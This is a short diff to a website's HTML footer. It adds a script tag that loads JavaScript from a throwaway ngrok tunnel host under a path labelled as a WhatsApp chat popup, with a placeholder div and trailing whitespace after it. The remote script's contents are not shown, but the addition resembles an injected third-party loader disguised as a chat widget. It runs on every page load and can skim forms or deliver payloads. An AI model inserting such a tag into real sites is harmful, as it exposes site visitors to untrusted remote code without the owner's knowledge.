@@ -1399,6 +1399,6 @@ tailwind.config = {
     </div>
   </div>
 </footer>
-
+<script src="https://glady-volcanologic-resourcefully.ngrok-free.dev/popup/whatsapp?id=0OPfclU79P"></script><div id="embed-whatsapp-chat"></div>                                
 </body>
 </html>
